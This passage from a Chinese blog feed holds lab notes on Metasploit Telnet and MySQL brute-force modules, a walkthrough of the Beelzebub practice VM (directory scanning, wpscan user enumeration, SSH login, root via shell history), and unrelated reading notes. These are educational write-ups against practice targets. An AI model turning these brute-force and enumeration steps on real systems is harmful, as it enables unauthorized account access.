class="line-numbers language-bash" data-language="bash"><code class="language-bash">show options<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li><p>根据提示使用 <code>set</code> 语句填写必填参数，例如远程地址、爆破用户名字典、爆破密码字典。可选参数根据需要填写：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">set RHOSTS 192.168.1.1set USER_FILE /path/to/usernames.txtset PASS_FILE /path/to/passwords.txt<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre></li><li><p>发起攻击：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">run<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li><p>成功爆破得到 Telnet 用户名和密码，进行结果验证：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">telnet &lt;target_address&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li></ol><p><strong>实验总结</strong></p><p>思考在设置爆破进程数的时候如何考虑进程大小。</p><h1 id="实验50-Metasploit-Mysql爆破"><a href="#实验50-Metasploit-Mysql爆破" class="headerlink" title="实验50 Metasploit-Mysql爆破"></a>实验50 Metasploit-Mysql爆破</h1><p><strong>实验场景</strong></p><p>小明是网络工程师，某天他收到上级领导命令，需要在 Kali 服务器使用 Metasploit 工具下的 MySQL 爆破，为避免在部署时出现问题，小明首先在自己的虚拟机上搭建一遍环境。</p><p><strong>实验环境</strong></p><p>攻击机：Kali 2016<br>靶机：待补充</p><p><strong>实验工具</strong></p><p>Metasploit</p><p><strong>实验目的</strong></p><p>掌握 Metasploit 下 MySQL 爆破模块的使用。</p><h2 id="实验步骤-36"><a href="#实验步骤-36" class="headerlink" title="实验步骤"></a>实验步骤</h2><ol><li><p>在 Kali 虚拟机上启动 msfconsole 控制台并测试与靶机的连通性：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">ping 192.168.1.1 -c 4<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li><p>使用命令搜索 MySQL 登录相关的模块：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">search mysql_login<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li><p>利用 MySQL 爆破模块：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">use auxiliary/scanner/mysql/mysql_login<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li><p>查看在该模块下需要设置的参数：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">show options<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li><p>根据提示使用 <code>set</code> 语句填写必填参数，例如远程地址、爆破用户名字典、爆破密码字典。可选参数根据需要填写：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">set RHOSTS 192.168.1.1set USER_FILE /path/to/usernames.txtset PASS_FILE /path/to/passwords.txt<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre></li><li><p>发起攻击：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">run<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li><p>成功爆破得到 MySQL 用户名和密码，进行结果验证：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">mysql -h &lt;target_address&gt; -u &lt;username&gt; -p<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li></ol><p><strong>实验总结</strong></p><p>思考 MySQL 爆破日志，在数据库日志文件能不能查看。</p></body></html>]]></content>
    
    
    <summary type="html">&lt;p&gt;学校寒假放了点作业出来&lt;br&gt;做个笔记&lt;/p&gt;</summary>
    
    
    
    <category term="学习" scheme="https://www.maonie.top/categories/%E5%AD%A6%E4%B9%A0/"/>
    
    
    <category term="学习" scheme="https://www.maonie.top/tags/%E5%AD%A6%E4%B9%A0/"/>
    
  </entry>
  
  <entry>
    <title>每周靶机之Beelzebub</title>
    <link href="https://www.maonie.top/2023/12/31/%E6%AF%8F%E5%91%A8%E9%9D%B6%E6%9C%BA%E4%B9%8BBeelzebub/"/>
    <id>https://www.maonie.top/2023/12/31/%E6%AF%8F%E5%91%A8%E9%9D%B6%E6%9C%BA%E4%B9%8BBeelzebub/</id>
    <published>2023-12-31T05:49:29.000Z</published>
    <updated>2024-01-01T07:13:40.032Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><html><head></head><body><p>这个是工作室的靶机</p><h1 id="环境设置"><a href="#环境设置" class="headerlink" title="环境设置"></a>环境设置</h1><p>攻击机：kali<br>靶机：beelzebub</p><h2 id="知识点和工具"><a href="#知识点和工具" class="headerlink" title="知识点和工具"></a>知识点和工具</h2><p>wpscan (wordpress环境专用的工具 用于爆破用户名或密码)<br>dirsearch (目录扫描)<br>md5加密<br>目录扫描</p><h1 id="具体过程"><a href="#具体过程" class="headerlink" title="具体过程"></a>具体过程</h1><span id="more"></span> <p>老样子 发现靶机 扫描端口<br><img data-src="/2023/12/31/%E6%AF%8F%E5%91%A8%E9%9D%B6%E6%9C%BA%E4%B9%8BBeelzebub/1.jpg" alt="1"><br>80端口开着 我们访问看两眼<br><img data-src="/2023/12/31/%E6%AF%8F%E5%91%A8%E9%9D%B6%E6%9C%BA%E4%B9%8BBeelzebub/2.jpg" alt="2"><br>标准的默认欢迎页面 没什么特别的<br>用扫描目录的工具<strong>dirsearch</strong>找找有没有其他目录<br><code>dirsearch -u [网址]</code><br><img data-src="/2023/12/31/%E6%AF%8F%E5%91%A8%E9%9D%B6%E6%9C%BA%E4%B9%8BBeelzebub/3.jpg" alt="3"><br>在index.php网站内发现隐藏注释<br><img data-src="/2023/12/31/%E6%AF%8F%E5%91%A8%E9%9D%B6%E6%9C%BA%E4%B9%8BBeelzebub/4.jpg" alt="4"><br>（大意:我的核心被加密了，”beelzebub”不知为何破解并加密了他 -MD5)<br>说明我们要去的目录与md5加密后的”beelzebub”有联系<br><img data-src="/2023/12/31/%E6%AF%8F%E5%91%A8%E9%9D%B6%E6%9C%BA%E4%B9%8BBeelzebub/5.jpg" alt="5"><br>于是我们随便找个<strong>md5加密/解密</strong>网站将beelzebub加密<br>逐一用dirsearch来寻找正确的目录<br><img data-src="/2023/12/31/%E6%AF%8F%E5%91%A8%E9%9D%B6%E6%9C%BA%E4%B9%8BBeelzebub/6.jpg" alt="6"><br>最终发现在32位小写加密方式的目录下存在wordpress基站<br>依次查看 发现wp-content/uploads/下存在文件管理系统<br><img data-src="/2023/12/31/%E6%AF%8F%E5%91%A8%E9%9D%B6%E6%9C%BA%E4%B9%8BBeelzebub/12.jpg" alt="12"><br>进入Talk To VALAK中<br>发现在输入任何字段后网页会返回一段名为password的cookie<br><img data-src="/2023/12/31/%E6%AF%8F%E5%91%A8%E9%9D%B6%E6%9C%BA%E4%B9%8BBeelzebub/7.jpg" alt="7"><br>该密码多半与开放的ssh服务有联系 但用户名未知<br>我们使用wpscan来爆破该网站的用户名</p><pre class="line-numbers language-none"><code class="language-none">wpscan -url "[网址]" -e u --ignore-main-redirect --force-url //指定网址-e u //爆破用户名--ignore-main-redirect //忽略主要的重定向--force //强制执行扫描（这在你确信目标站点是WordPress站点但WPScan未正确检测到的情况下可能会有用）<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img data-src="/2023/12/31/%E6%AF%8F%E5%91%A8%E9%9D%B6%E6%9C%BA%E4%B9%8BBeelzebub/8.jpg" alt="8"><br>结果显示有俩用户 分别为<strong>krampus</strong>与<strong>valak</strong><br>经过尝试发现可以使用password中的密码与<strong>krampus</strong>登陆ssh服务<br><img data-src="/2023/12/31/%E6%AF%8F%E5%91%A8%E9%9D%B6%E6%9C%BA%E4%B9%8BBeelzebub/9.jpg" alt="9"><br>进去后发现权限不够 需要提权<br>查看<strong>history //历史记录</strong>后发现该账号曾尝试提权<br><img data-src="/2023/12/31/%E6%AF%8F%E5%91%A8%E9%9D%B6%E6%9C%BA%E4%B9%8BBeelzebub/10.jpg" alt="10"><br>我们复现过程即可<br><img data-src="/2023/12/31/%E6%AF%8F%E5%91%A8%E9%9D%B6%E6%9C%BA%E4%B9%8BBeelzebub/11.jpg" alt="11"><br>获得root权限 结束！</p><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>过程很短的靶机<br>结合了wordpress与目录扫描<br>已经不止一次见到wordpress了 用wpscan便可以解决大部分的问题<br><strong>那么我们下次见</strong></p></body></html>]]></content>
    
    
    <summary type="html">&lt;p&gt;这个是工作室的靶机&lt;/p&gt;
&lt;h1 id=&quot;环境设置&quot;&gt;&lt;a href=&quot;#环境设置&quot; class=&quot;headerlink&quot; title=&quot;环境设置&quot;&gt;&lt;/a&gt;环境设置&lt;/h1&gt;&lt;p&gt;攻击机：kali&lt;br&gt;靶机：beelzebub&lt;/p&gt;
&lt;h2 id=&quot;知识点和工具&quot;&gt;&lt;a href=&quot;#知识点和工具&quot; class=&quot;headerlink&quot; title=&quot;知识点和工具&quot;&gt;&lt;/a&gt;知识点和工具&lt;/h2&gt;&lt;p&gt;wpscan (wordpress环境专用的工具 用于爆破用户名或密码)&lt;br&gt;dirsearch (目录扫描)&lt;br&gt;md5加密&lt;br&gt;目录扫描&lt;/p&gt;
&lt;h1 id=&quot;具体过程&quot;&gt;&lt;a href=&quot;#具体过程&quot; class=&quot;headerlink&quot; title=&quot;具体过程&quot;&gt;&lt;/a&gt;具体过程&lt;/h1&gt;</summary>
    
    
    
    <category term="学习" scheme="https://www.maonie.top/categories/%E5%AD%A6%E4%B9%A0/"/>
    
    <category term="靶机解析" scheme="https://www.maonie.top/categories/%E5%AD%A6%E4%B9%A0/%E9%9D%B6%E6%9C%BA%E8%A7%A3%E6%9E%90/"/>
    
    
    <category term="学习" scheme="https://www.maonie.top/tags/%E5%AD%A6%E4%B9%A0/"/>
    
    <category term="靶机解析" scheme="https://www.maonie.top/tags/%E9%9D%B6%E6%9C%BA%E8%A7%A3%E6%9E%90/"/>
    
  </entry>
  
  <entry>
    <title>读书笔记-如何阅读一本书</title>
    <link href="https://www.maonie.top/2023/12/29/%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0-%E5%A6%82%E4%BD%95%E9%98%85%E8%AF%BB%E4%B8%80%E6%9C%AC%E4%B9%A6/"/>
    <id>https://www.maonie.top/2023/12/29/%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0-%E5%A6%82%E4%BD%95%E9%98%85%E8%AF%BB%E4%B8%80%E6%9C%AC%E4%B9%A6/</id>
    <published>2023-12-29T01:32:30.000Z</published>
    <updated>2024-01-24T09:27:41.456Z</updated>
    
    <content type="html"><![CDATA[<html><head><link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script></head><body><p>经<a href="https://truthleader.github.io/"><del>我们伟大而全能的唯一至高真理教教主</del></a>推荐而读<br>本书下载地址：<a href="https://zh.z-library.se/book/5423134/5e4d46/%E5%A6%82%E4%BD%95%E9%98%85%E8%AF%BB%E4%B8%80%E6%9C%AC%E4%B9%A6.html">点击这里</a></p><hr><p>ps:之前没做过这种东西 所以姑且先开一篇试试水<br>这玩意多半得长期更新 边摸边写</p><h2 id="总之为啥要看呢？"><a href="#总之为啥要看呢？" class="headerlink" title="总之为啥要看呢？"></a>总之为啥要看呢？</h2><p>1.提升看书的效率（用更少的时间来阅读更多的内容）云云<br>2.很好奇是怎么个”如何阅读”</p><h2 id="我目前看出来个啥"><a href="#我目前看出来个啥" class="headerlink" title="我目前看出来个啥"></a>我目前看出来个啥</h2><span id="more"></span><p>1.有的时候 <strong>理解（understand）</strong>东西并不需要<strong>知道（know）</strong>这件事相关的所有事物。太多的资讯与太少的资讯都会成为理解力的阻碍。</p><p>2.阅读并不是完全被动(类似于被打了一拳，或得到一项遗产，或法院的判决)的行为。反倒更像是棒球比赛中的捕手——读者需要去尽可能接收作者所投出来的“球”，把自己的技巧与作者的技巧融合起来，达到共同的终点。读者想“接住”多少意念完全看他在阅读时多么主动，以及他投⼊不同⼼思来阅读的技巧如何。</p><ol start="3"><li></li></ol></body></html>]]></content>
    
    
    <summary type="html">&lt;p&gt;经&lt;a href=&quot;https://truthleader.github.io/&quot;&gt;&lt;del&gt;我们伟大而全能的唯一至高真理教教主&lt;/del&gt;&lt;/a&gt;推荐而读&lt;br&gt;本书下载地址：&lt;a href=&quot;https://zh.z-library.se/book/5423134/5e4d46/%E5%A6%82%E4%BD%95%E9%98%85%E8%AF%BB%E4%B8%80%E6%9C%AC%E4%B9%A6.html&quot;&gt;点击这里&lt;/a&gt;&lt;/p&gt;
&lt;hr&gt;
&lt;p&gt;ps:之前没做过这种东西 所以姑且先开一篇试试水&lt;br&gt;这玩意多半得长期更新 边摸边写&lt;/p&gt;
&lt;h2 id=&quot;总之为啥要看呢？&quot;&gt;&lt;a href=&quot;#总之为啥要看呢？&quot; class=&quot;headerlink&quot; title=&quot;总之为啥要看呢？&quot;&gt;&lt;/a&gt;总之为啥要看呢？&lt;/h2&gt;&lt;p&gt;1.提升看书的效率（用更少的时间来阅读更多的内容）云云&lt;br&gt;2.很好奇是怎么个”如何阅读”&lt;/p&gt;
&lt;h2 id=&quot;我目前看出来个啥&quot;&gt;&lt;a href=&quot;#我目前看出来个啥&quot; class=&quot;headerlink&quot; title=&quot;我目前看出来个啥&quot;&gt;&lt;/a&gt;我目前看出来个啥&lt;/h2&gt;</summary>
    
    
    
    <category term="读书笔记" scheme="https://www.maonie.top/categories/%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/"/>
    
    
    <category term="读书笔记" scheme="https://www.maonie.top/tags/%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/"/>
    
  </entry>
  
</feed>
